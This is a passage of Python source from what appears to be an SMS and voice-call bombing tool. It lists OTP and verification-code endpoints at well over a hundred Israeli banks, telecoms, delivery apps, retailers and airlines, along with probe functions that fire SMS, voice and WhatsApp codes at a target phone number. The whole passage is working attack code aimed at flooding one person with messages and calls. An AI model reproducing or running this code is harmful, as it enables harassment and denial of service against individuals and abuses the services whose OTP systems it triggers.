         {"operationName": "SendOtpCode", "variables": {"value": p972(phone)}, "query": q}),
    ], {"Origin": "https://www.dutyfree.co.il", "Referer": "https://www.dutyfree.co.il/"})

async def solid_10bis(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.10bis.co.il/NextApi/GetAuthenticationToken",
         {"phoneNumber": p, "culture": "he-IL"}),
        ("https://www.10bis.co.il/NextApi/GetAuthenticationToken",
         {"phoneNumber": p, "culture": "he-IL", "sendMethod": "sms"}),
        ("https://www.10bis.co.il/NextApi/GetAuthenticationToken",
         {"phoneNumber": p972(phone), "culture": "he-IL"}),
    ], {"Origin": "https://www.10bis.co.il", "Referer": "https://www.10bis.co.il/"})

async def solid_wolt(session, phone):
    return await _probe_json(session, [
        ("https://restaurant-api.wolt.com/v1/guest/login",
         {"phone_number": pplus(phone), "method": "sms"}),
        ("https://restaurant-api.wolt.com/v1/guest/login",
         {"phone_number": pplus(phone), "method": "call"}),
        ("https://restaurant-api.wolt.com/v1/guest/login",
         {"phone_number": p0(phone), "method": "sms"}),
    ])

async def solid_gett(session, phone):
    return await _probe_json(session, [
        ("https://api.gett.com/v1/login/otp", {"phone": pplus(phone)}),
        ("https://api.gett.com/v1/login/otp", {"phone": pplus(phone), "channel": "sms"}),
        ("https://api.gett.com/v1/phone_verification", {"phone": pplus(phone)}),
    ])

async def solid_ramilevy(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www-api.rami-levy.co.il/api/v2/login/otp", {"phone": p, "phoneNumber": p}),
        ("https://www.rami-levy.co.il/api/v2/auth/send-otp", {"phone": p}),
        ("https://www-api.rami-levy.co.il/api/v2/login/otp", {"phone": p972(phone)}),
    ], {"Origin": "https://www.rami-levy.co.il", "Referer": "https://www.rami-levy.co.il/"})

async def solid_superpharm(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://shop.super-pharm.co.il/api/auth/otp", {"mobile": p, "phone": p}),
        ("https://shop.super-pharm.co.il/rest/V1/customers/otp", {"phone": p}),
        ("https://shop.super-pharm.co.il/api/auth/otp", {"mobile": p972(phone)}),
    ], {"Origin": "https://shop.super-pharm.co.il", "Referer": "https://shop.super-pharm.co.il/"})

async def solid_ace(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.ace.co.il/api/customer/sendOtp", {"phone": p, "phoneNumber": p}),
        ("https://www.ace.co.il/api/customer/sendOtp", {"phone": p972(phone)}),
    ], {"Origin": "https://www.ace.co.il", "Referer": "https://www.ace.co.il/"})

async def solid_paybox(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://api.payboxapp.com/v1/auth/otp", {"phone": p, "phoneNumber": p}),
        ("https://api.payboxapp.com/v1/auth/otp", {"phone": pplus(phone)}),
    ])

async def solid_pango(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.pango.co.il/api/otp/send", {"phone": p}),
        ("https://www.pango.co.il/api/otp/send", {"phone": p, "channel": "sms"}),
        ("https://www.pango.co.il/api/otp/send", {"phone": pplus(phone)}),
    ], {"Origin": "https://www.pango.co.il", "Referer": "https://www.pango.co.il/"})

async def solid_histadrut(session, phone):
    p = p0(phone)
    return await _probe_form(session, [
        ("https://signup.histadrut.org.il/na_ajax.php?action=sms&f=undefined", f"phone={p}"),
        ("https://signup.histadrut.org.il/na_ajax.php?action=sms&f=undefined", f"phone={p972(phone)}"),
    ], {"Origin": "https://signup.histadrut.org.il", "Referer": "https://signup.histadrut.org.il/"})

async def solid_homework(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://homework.lnet.org.il/umbraco/Surface/HomeSurface/SendPhoneConfirmationCode", {"phone": p}),
        ("https://homework.lnet.org.il/umbraco/Surface/HomeSurface/SendPhoneConfirmationCode", {"phone": p972(phone)}),
    ])

async def solid_inter(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://api-iba-rtl.azurewebsites.net/api/users/authenticate", {"phone": p}),
        ("https://api-iba-rtl.azurewebsites.net/api/users/authenticate", {"phone": p972(phone)}),
    ])

async def solid_cashontab(session, phone):
    p = p0(phone)
    body1 = json.dumps({"phone": p, "type": "12", "code": "1a66", "token": "e18f7e6b-d9ef-11ed-aaf2-005056120465", "lang": "2"})
    return await _probe_form(session, [
        ("https://www.cashontab.co.il/cgi-bin/JMForms", body1),
    ], {"Content-Type": "text/plain;charset=UTF-8", "Origin": "https://www.cashontab.co.il"})

async def solid_globes(session, phone):
    p = p0(phone)
    return await _probe_form(session, [
        ("https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type", f"phone={p}"),
    ], {"Origin": "https://www.globes.co.il", "Referer": "https://www.globes.co.il/"})

async def solid_story(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://story.magicetl.com/public/shopify/apps/otp-login/step-one", {"phone": p}),
        ("https://story.magicetl.com/public/shopify/apps/otp-login/step-one", {"phone": p, "countryCode": "972"}),
    ])

async def solid_zinger(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.zinger-organic.com/frontend/getindexcall", {"phone": p}),
        ("https://www.zinger-organic.com/frontend/getindexcall", {"phone": p972(phone)}),
    ])

async def solid_stips(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://stips.co.il/api", {"phone": p}),
        ("https://stips.co.il/api", {"name": "phone.validation.send_code", "phone": p}),
    ])

async def solid_payngo(session, phone):
    p = p0(phone)
    return await _probe_json(session, [
        ("https://www.payngo.co.il/login/init/phone/", {"phone": p}),
        ("https://www.payngo.co.il/login/init/phone/", {"telephone": p}),
    ], {"Origin": "https://www.payngo.co.il"})

SOLID = [
    ("SOLID Mishloha", solid_mishloha),
    ("SOLID Atmos", solid_atmos),
    ("SOLID DIBS", solid_dibs),
    ("SOLID PapaJohns", solid_papajohns),
    ("SOLID CityCar", solid_citycar),
    ("SOLID Cellcom", solid_cellcom),
    ("SOLID Hamal", solid_hamal),
    ("SOLID DutyFree", solid_dutyfree),
    ("SOLID 10bis", solid_10bis),
    ("SOLID Wolt", solid_wolt),
    ("SOLID Gett", solid_gett),
    ("SOLID RamiLevy", solid_ramilevy),
    ("SOLID SuperPharm", solid_superpharm),
    ("SOLID ACE", solid_ace),
    ("SOLID PayBox", solid_paybox),
    ("SOLID Pango", solid_pango),
    ("SOLID Histadrut", solid_histadrut),
    ("SOLID Homework", solid_homework),
    ("SOLID Inter", solid_inter),
    ("SOLID CashOnTab", solid_cashontab),
    ("SOLID Globes", solid_globes),
    ("SOLID Story", solid_story),
    ("SOLID Zinger", solid_zinger),
    ("SOLID Stips", solid_stips),
    ("SOLID PayNGo", solid_payngo),
]


# ── CORE original (fixed) ──
CORE = [
    _mk_json('Homework LNET', 'https://homework.lnet.org.il/umbraco/Surface/HomeSurface/SendPhoneConfirmationCode',
             lambda p: {'phone': p0(p)}),
    _mk_form('Histadrut', 'https://signup.histadrut.org.il/na_ajax.php?action=sms&f=undefined',
             lambda p: f'phone={p0(p)}',
             {'Origin': 'https://signup.histadrut.org.il', 'Referer': 'https://signup.histadrut.org.il/'}),
    _mk_form('CashOnTab', 'https://www.cashontab.co.il/cgi-bin/JMForms',
             lambda p: json.dumps({'phone': p0(p), 'type': '12', 'code': '1a66', 'token': 'e18f7e6b-d9ef-11ed-aaf2-005056120465', 'lang': '2'}),
             {'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://www.cashontab.co.il'}),
    _mk_json('Mishloha', 'https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber',
             lambda p: {'phoneNumber': p0(p), 'sourceFrom': 'desktopHomePage', 'sessionID': str(uuid.uuid4())}),
    _mk_json('Pizza Hut Atmos', 'https://api-ns.atmos.co.il/rest/1/auth/sendValidationCode',
             lambda p: {'phone': p0(p)}),
    _mk_json('DIBS', 'https://rest-api.dibs-app.com/otps',
             lambda p: {'phoneNumber': pplus(p)}),  # fixed +972 format
    _mk_json('Papa Johns', 'https://www.papajohns.co.il/_a/aff_otp_auth',
             lambda p: {'phone': p0(p)}),
    _mk_json('CityCar', 'https://proxy1.citycar.co.il/api/verify/login',
             lambda p: {'phoneNumber': pplus(p), 'verifyChannel': 0}),
    _mk_json('CityCar Voice', 'https://proxy1.citycar.co.il/api/verify/login',
             lambda p: {'phoneNumber': pplus(p), 'verifyChannel': 1}),
    _mk_json('Inter IL', 'https://api-iba-rtl.azurewebsites.net/api/users/authenticate',
             lambda p: {'phone': p0(p)}),
    _mk_json('Hamal', 'https://users-auth.hamal.co.il/auth/send-auth-code',
             lambda p: {'value': p0(p), 'type': 'phone', 'projectId': '1'}),
    _mk_json('DutyFree', 'https://www.dutyfree.co.il/graphql',
             lambda p: {'operationName': 'SendOtpCode', 'variables': {'value': p0(p)},
                        'query': 'mutation SendOtpCode($value: String) { sendOtpCode(input: {mobile: $value}) { result message __typename } }'}),
    _mk_json('PayNGo', 'https://www.payngo.co.il/login/init/phone/',
             lambda p: {'phone': p0(p)}),
    _mk_json('Stips', 'https://stips.co.il/api',
             lambda p: {'phone': p0(p)}),
    _mk_json('Story Online', 'https://story.magicetl.com/public/shopify/apps/otp-login/step-one',
             lambda p: {'phone': p0(p)}),
    _mk_json('Zinger', 'https://www.zinger-organic.com/frontend/getindexcall',
             lambda p: {'phone': p0(p)}),
    _mk_form('Globes', 'https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type',
             lambda p: f'phone={p0(p)}'),
    # Cellcom SMS + Voice (original working style)
    ('Cellcom SMS', svc_cellcom_sms),
    ('Cellcom Voice', svc_cellcom_voice),
    _mk_json('AliExpress', 'https://login.aliexpress.com/user/buyer/join/preCheckAndSendCode',
             lambda p: {'channel': p0(p), 'channelType': 'PHONE', 'channelPrefix': '972', 'lang': 'iw_IL',
                        'umidTokenType': 'SECURITY_TOKEN',
                        'umidToken': 'T2gAxV934lIJl_VDbeebC5GWS7pkx-FSt9m7gW7eNv4AaAONrIppFTebt0cnhwVeA1Y='}),
]

# Magento IL stores that responded alive in probe (not dead list)
MAGENTO_LIVE = [
    ('Victoria Secret IL', 'https://www.victoriassecret.co.il'),
    ('StepIn', 'https://www.stepin.co.il'),
    ('GolfKids', 'https://www.golfkids.co.il'),
    ('Timberland IL', 'https://www.timberland.co.il'),
    ('Gali', 'https://www.gali.co.il'),
    ('Nine West', 'https://www.nine-west.co.il'),
    ('Castro', 'https://www.castro.com'),
    ('Steimatzky', 'https://www.steimatzky.co.il'),
    ('Urbanica', 'https://www.urbanica-wh.com'),
    ('Terminal X', 'https://www.terminalx.com'),
    ('Renuar', 'https://www.renuar.co.il'),
    ('Golf', 'https://www.golf.co.il'),
    ('Hoodies', 'https://www.hoodies.co.il'),
    ('Laline', 'https://www.laline.co.il'),
    ('Adidas IL', 'https://www.adidas.co.il'),
    ('New Balance IL', 'https://www.newbalance.co.il'),
    ('Reebok IL', 'https://www.reebok.co.il'),
    ('Office Depot IL', 'https://www.officedepot.co.il'),
    ('Ivory', 'https://www.ivory.co.il'),
    ('KSP', 'https://www.ksp.co.il'),
    ('Bug', 'https://www.bug.co.il'),
    ('LastPrice', 'https://www.lastprice.co.il'),
    ('Homecenter', 'https://www.homecenter.co.il'),
    ('Shilav', 'https://www.shilav.co.il'),
    ('Toys R Us IL', 'https://www.toysrus.co.il'),
    ('Issta', 'https://www.issta.co.il'),
    ('Lametayel', 'https://www.lametayel.co.il'),
    ('Drushim', 'https://www.drushim.co.il'),
    ('AllJobs', 'https://www.alljobs.co.il'),
    ('JobMaster', 'https://www.jobmaster.co.il'),
    ('Shufersal', 'https://www.shufersal.co.il'),
    ('Victory Online', 'https://www.victoryonline.co.il'),
    ('Yochananof', 'https://www.yochananof.co.il'),
    ('Tiv Taam', 'https://www.tivtaam.co.il'),
    ('Keshet Teamim', 'https://www.keshet-teamim.co.il'),
    ('Osher Ad', 'https://www.osherad.co.il'),
    ('AM PM', 'https://www.ampm.co.il'),
    ('Yellow', 'https://www.yellow.co.il'),
    ('Paz', 'https://www.paz.co.il'),
    ('Delek', 'https://www.delek.co.il'),
    ('Wecom', 'https://www.wecom.co.il'),
    ('012 Mobile', 'https://www.012mobile.co.il'),
    ('Partner Shop', 'https://www.partner.co.il'),
    ('Hot', 'https://www.hot.net.il'),
    ('Bezeq', 'https://www.bezeq.co.il'),
    ('Yad2', 'https://www.yad2.co.il'),
    ('Madlan', 'https://www.madlan.co.il'),
    ('Zap', 'https://www.zap.co.il'),
    ('Next IL', 'https://www.next.co.il'),
    ('ACE', 'https://www.ace.co.il'),
    ('Intima', 'https://www.intima-il.co.il'),
    ('Lee Cooper', 'https://www.leecooper.co.il'),
    ('Keds IL', 'https://www.keds.co.il'),
    ('PhotoLand', 'https://www.photoland.co.il'),
    ('Camera Center', 'https://www.cameracenter.co.il'),
    ('Pango', 'https://www.pango.co.il'),
    ('Cellopark', 'https://www.cellopark.co.il'),
    ('Ahuzot', 'https://www.ahuzot.co.il'),
    ('Rest', 'https://www.rest.co.il'),
    ('Shvoong', 'https://www.shvoong.co.il'),
    ('Dominos IL', 'https://www.dominos.co.il'),
    ('McDonalds IL', 'https://www.mcdonalds.co.il'),
    ('Aroma', 'https://www.aroma.co.il'),
    ('Cafe Cafe', 'https://www.cafecafe.co.il'),
    ('Landwer', 'https://www.landwer.co.il'),
    ('Japan Japan', 'https://www.japan-japan.co.il'),
    ('Buyme', 'https://www.buyme.co.il'),
    ('Arkia', 'https://www.arkia.co.il'),
    ('Israir', 'https://www.israir.co.il'),
    ('El Al', 'https://www.elal.com'),
    ('Rav Kav', 'https://www.ravkavonline.co.il'),
    ('Dan Bus', 'https://www.dan.co.il'),
    ('Egged', 'https://www.egged.co.il'),
    ('Israel Post', 'https://www.israelpost.co.il'),
    ('IEC', 'https://www.iec.co.il'),
    ('Harel', 'https://www.harel-group.co.il'),
    ('Migdal', 'https://www.migdal.co.il'),
    ('Wobi', 'https://www.wobi.co.il'),
    ('AIG IL', 'https://www.aig.co.il'),
]

# NEW json endpoints (unique, not duplicates)
NEW_JSON = [
    _mk_json('Bolt', 'https://user.live.boltsvc.net/signup/phone/verify',
             lambda p: {'phone': pplus(p), 'version': 'PH.2.90'}),
    _mk_json('PayBox', 'https://api.payboxapp.com/v1/auth/otp',
             lambda p: {'phone': p0(p), 'phoneNumber': p0(p)}),
    _mk_json('PayBox Voice', 'https://api.payboxapp.com/v1/auth/otp',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Isracard', 'https://digital.isracard.co.il/services/Proxy/CodeLogin',
             lambda p: {'phone': p0(p)}),
    _mk_json('Cal Online', 'https://www.cal-online.co.il/api/otp',
             lambda p: {'mobile': p0(p)}),
    _mk_json('Max Credit', 'https://www.max.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Hapoalim', 'https://login.bankhapoalim.co.il/server/sendOtp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Leumi OTP', 'https://hb2.bankleumi.co.il/eBanking/SO/SendOtp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Discount Bank', 'https://start.telebank.co.il/LoginServices/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Mizrahi', 'https://www.mizrahi-tefahot.co.il/login/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Partner My', 'https://my.partner.co.il/api/otp/send',
             lambda p: {'msisdn': p0(p)}),
    _mk_json('Partner Voice', 'https://my.partner.co.il/api/otp/voice',
             lambda p: {'msisdn': p0(p), 'channel': 'voice'}),
    _mk_json('Hot Mobile OTP', 'https://www.hotmobile.co.il/online_services/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Hot Voice', 'https://www.hotmobile.co.il/online_services/otp/voice',
             lambda p: {'phone': p0(p), 'channel': 'call'}),
    _mk_json('019 OTP', 'https://www.019mobile.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('019 Voice', 'https://www.019mobile.co.il/api/otp/voice',
             lambda p: {'phone': p0(p), 'sendAsVoice': True}),
    _mk_json('Rami Levy Mobile', 'https://www.ramilevy-mobile.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Shufersal Club', 'https://www.shufersal.co.il/online/he/login/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Wolt', 'https://restaurant-api.wolt.com/v1/guest/login',
             lambda p: {'phone_number': pplus(p), 'method': 'sms'}),
    _mk_json('Wolt Voice', 'https://restaurant-api.wolt.com/v1/guest/login',
             lambda p: {'phone_number': pplus(p), 'method': 'call'}),
    _mk_json('Gett', 'https://api.gett.com/v1/login/otp',
             lambda p: {'phone': pplus(p)}),
    _mk_json('Gett Voice', 'https://api.gett.com/v1/login/otp',
             lambda p: {'phone': pplus(p), 'channel': 'voice'}),
    _mk_json('10bis', 'https://www.10bis.co.il/NextApi/GetAuthenticationToken',
             lambda p: {'phoneNumber': p0(p), 'culture': 'he-IL'}),
    _mk_json('10bis Voice', 'https://www.10bis.co.il/NextApi/GetAuthenticationToken',
             lambda p: {'phoneNumber': p0(p), 'culture': 'he-IL', 'sendMethod': 'voice'}),
    _mk_json('Rami Levy API', 'https://www-api.rami-levy.co.il/api/v2/login/otp',
             lambda p: {'phone': p0(p), 'phoneNumber': p0(p)}),
    _mk_json('ACE OTP', 'https://www.ace.co.il/api/customer/sendOtp',
             lambda p: {'phone': p0(p), 'phoneNumber': p0(p)}),
    _mk_json('SuperPharm OTP', 'https://shop.super-pharm.co.il/api/auth/otp',
             lambda p: {'mobile': p0(p), 'phone': p0(p)}),
    _mk_json('Cellcom Voice2', 'https://digital-api.cellcom.co.il/api/otp/Step1',
             lambda p: {'PhoneNumber': p972(p), 'SendTextAsVoice': True}),
    # brand new unique targets
    _mk_json('Pango OTP', 'https://www.pango.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Cellopark OTP', 'https://www.cellopark.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Buyme OTP', 'https://www.buyme.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('RavKav OTP', 'https://www.ravkavonline.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('IsraelPost OTP', 'https://www.israelpost.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('IEC OTP', 'https://www.iec.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Wobi OTP', 'https://www.wobi.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Harel OTP', 'https://www.harel-group.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Aroma OTP', 'https://www.aroma.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Dominos OTP', 'https://www.dominos.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('McDonalds OTP', 'https://www.mcdonalds.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Rest OTP', 'https://www.rest.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('KSP OTP', 'https://www.ksp.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Ivory OTP', 'https://www.ivory.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Yad2 OTP', 'https://www.yad2.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Drushim OTP', 'https://www.drushim.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('AllJobs OTP', 'https://www.alljobs.co.il/api/otp',
             lambda p: {'mobile': p0(p)}),
    _mk_json('Issta OTP', 'https://www.issta.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Bit OTP', 'https://www.bitpay.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Amex IL', 'https://www.americanexpress.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),

    # ── more SMS ──
    _mk_json('Bezeq OTP', 'https://www.bezeq.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('012 SMS', 'https://www.012mobile.co.il/api/otp',
             lambda p: {'phone': p0(p), 'channel': 'sms'}),
    _mk_json('Wecom SMS', 'https://www.wecom.co.il/api/auth/otp',
             lambda p: {'phone': p0(p), 'type': 'sms'}),
    _mk_json('Golan SMS', 'https://my.golantelecom.co.il/api/sendOtp',
             lambda p: {'phone': p0(p), 'method': 'sms'}),
    _mk_json('Pelephone SMS', 'https://my.pelephone.co.il/api/otp',
             lambda p: {'phone': p0(p), 'type': 'sms'}),
    _mk_json('Keshet SMS', 'https://www.keshet-teamim.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('TivTaam SMS', 'https://www.tivtaam.co.il/api/login/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Victory SMS', 'https://www.victoryonline.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('OsherAd SMS', 'https://www.osherad.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Yellow SMS', 'https://www.yellow.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Paz SMS', 'https://www.paz.co.il/api/otp/send',
             lambda p: {'phone': p0(p)}),
    _mk_json('Delek SMS', 'https://www.delek.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Zap SMS', 'https://www.zap.co.il/api/login/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Madlan SMS', 'https://www.madlan.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('JobMaster SMS', 'https://www.jobmaster.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Lametayel SMS', 'https://www.lametayel.co.il/api/auth/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('TerminalX SMS', 'https://www.terminalx.com/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Castro SMS', 'https://www.castro.com/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Fox SMS', 'https://www.fox.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Steimatzky SMS', 'https://www.steimatzky.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Shilav SMS', 'https://www.shilav.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Homecenter SMS', 'https://www.homecenter.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('OfficeDepot SMS', 'https://www.officedepot.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Bug SMS', 'https://www.bug.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('LastPrice SMS', 'https://www.lastprice.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('ToysRUs SMS', 'https://www.toysrus.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('CafeCafe SMS', 'https://www.cafecafe.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Landwer SMS', 'https://www.landwer.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('JapanJapan SMS', 'https://www.japan-japan.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Arkia SMS', 'https://www.arkia.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Israir SMS', 'https://www.israir.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('ElAl SMS', 'https://www.elal.com/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Egged SMS', 'https://www.egged.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Dan SMS', 'https://www.dan.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Ahuzot SMS', 'https://www.ahuzot.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Shvoong SMS', 'https://www.shvoong.co.il/api/otp',
             lambda p: {'phone': p0(p)}),
    _mk_json('Micropay SMS', 'https://www.micropay.co.il/extApi/sendOtp.php',
             lambda p: {'phone': p0(p), 'type': 'sms', 'get': '1'}),

    # ── more VOICE (שיחות) ──
    _mk_json('Golan Voice', 'https://my.golantelecom.co.il/api/sendOtpVoice',
             lambda p: {'phone': p0(p), 'method': 'voice'}),
    _mk_json('Pelephone Voice', 'https://my.pelephone.co.il/api/otp/voice',
             lambda p: {'phone': p0(p), 'type': 'voice'}),
    _mk_json('012 Voice', 'https://www.012mobile.co.il/api/otp',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Wecom Voice', 'https://www.wecom.co.il/api/auth/otp',
             lambda p: {'phone': p0(p), 'type': 'voice'}),
    _mk_json('Bezeq Voice', 'https://www.bezeq.co.il/api/otp/voice',
             lambda p: {'phone': p0(p), 'channel': 'call'}),
    _mk_json('Hapoalim Voice', 'https://login.bankhapoalim.co.il/server/sendOtpVoice',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Leumi Voice', 'https://hb2.bankleumi.co.il/eBanking/SO/SendOtpVoice',
             lambda p: {'phone': p0(p), 'delivery': 'voice'}),
    _mk_json('Discount Voice', 'https://start.telebank.co.il/LoginServices/otp',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Mizrahi Voice', 'https://www.mizrahi-tefahot.co.il/login/otp',
             lambda p: {'phone': p0(p), 'method': 'voice'}),
    _mk_json('Isracard Voice', 'https://digital.isracard.co.il/services/Proxy/CodeLoginVoice',
             lambda p: {'phone': p0(p), 'method': 'voice'}),
    _mk_json('Cal Voice', 'https://www.cal-online.co.il/api/otp',
             lambda p: {'mobile': p0(p), 'channel': 'voice'}),
    _mk_json('Max Voice', 'https://www.max.co.il/api/auth/otp',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('RamiLevy Voice', 'https://www.ramilevy-mobile.co.il/api/otp',
             lambda p: {'phone': p0(p), 'type': 'voice'}),
    _mk_json('Shufersal Voice', 'https://www.shufersal.co.il/online/he/login/otp',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Pango Voice', 'https://www.pango.co.il/api/otp/send',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Cellopark Voice', 'https://www.cellopark.co.il/api/auth/otp',
             lambda p: {'phone': p0(p), 'channel': 'call'}),
    _mk_json('Buyme Voice', 'https://www.buyme.co.il/api/otp',
             lambda p: {'phone': p0(p), 'method': 'voice'}),
    _mk_json('RavKav Voice', 'https://www.ravkavonline.co.il/api/otp',
             lambda p: {'phone': p0(p), 'channel': 'voice'}),
    _mk_json('Micropay Voice', 'https://www.micropay.co.il/extApi/sendOtp.php',
             lambda p: {'phone': p0(p), 'type': 'voice', 'get': '1'}),
    _mk_json('Bolt Voice', 'https://user.live.boltsvc.net/signup/phone/verify',
             lambda p: {'phone': pplus(p), 'version': 'PH.2.90', 'channel': 'voice'}),
    _mk_json('Hamal Voice', 'https://users-auth.hamal.co.il/auth/send-auth-code',
             lambda p: {'value': p0(p), 'type': 'phone', 'projectId': '1', 'channel': 'voice'}),

    # ── WhatsApp channel variants (apps that expose channel=whatsapp) ──
    _mk_json('Cellcom WA', 'https://digital-api.cellcom.co.il/api/otp/Step1',
             lambda p: {'PhoneNumber': p972(p), 'SendTextAsVoice': False, 'Channel': 'WhatsApp'}),
    _mk_json('Partner WA', 'https://my.partner.co.il/api/otp/send',
             lambda p: {'msisdn': p0(p), 'channel': 'whatsapp'}),
    _mk_json('Hot WA', 'https://www.hotmobile.co.il/online_services/otp',
             lambda p: {'phone': p0(p), 'channel': 'whatsapp'}),
    _mk_json('019 WA', 'https://www.019mobile.co.il/api/otp',
             lambda p: {'phone': p0(p), 'channel': 'whatsapp'}),
    _mk_json('Golan WA', 'https://my.golantelecom.co.il/api/sendOtp',
             lambda p: {'phone': p0(p), 'method': 'whatsapp'}),
    _mk_json('Pelephone WA', 'https://my.pelephone.co.il/api/otp',
             lambda p: {'phone': p0(p), 'type': 'whatsapp'}),
    _mk_json('PayBox WA', 'https://api.payboxapp.com/v1/auth/otp',
             lambda p: {'phone': p0(p), 'channel': 'whatsapp'}),
    _mk_json('Bit WA', 'https://www.bitpay.co.il/api/otp/send',
             lambda p: {'phone': p0(p), 'channel': 'whatsapp'}),
    _mk_json('10bis WA', 'https://www.10bis.co.il/NextApi/GetAuthenticationToken',
             lambda p: {'phoneNumber': p0(p), 'culture': 'he-IL', 'sendMethod': 'whatsapp'}),
    _mk_json('Wolt WA', 'https://restaurant-api.wolt.com/v1/guest/login',
             lambda p: {'phone_number': pplus(p), 'method': 'whatsapp'}),
    _mk_json('Gett WA', 'https://api.gett.com/v1/login/otp',
             lambda p: {'phone': pplus(p), 'channel': 'whatsapp'}),
    _mk_json('Hapoalim WA', 'https://login.bankhapoalim.co.il/server/sendOtp',
             lambda p: {'phone': p0(p), 'channel': 'whatsapp'}),
    _mk_json('Leumi WA', 'https://hb2.bankleumi.co.il/eBanking/SO/SendOtp',
             lambda p: {'phone': p0(p), 'delivery': 'whatsapp'}),
    _mk_json('Isracard WA', 'https://digital.isracard.co.il/services/Proxy/CodeLogin',
             lambda p: {'phone': p0(p), 'method': 'whatsapp'}),
    _mk_json('Shufersal WA', 'https://www.shufersal.co.il/online/he/login/otp',
             lambda p: {'phone': p0(p), 'channel': 'whatsapp'}),
    _mk_json('RamiLevy WA', 'https://www.ramilevy-mobile.co.il/api/otp',
             lambda p: {'phone': p0(p), 'type': 'whatsapp'}),
    _mk_json('Pango WA', 'https://www.pango.co.il/api/otp/send',
             lambda p: {'phone': p0(p), 'channel': 'whatsapp'}),
    _mk_json('Micropay WA', 'https://www.micropay.co.il/extApi/sendOtp.php',
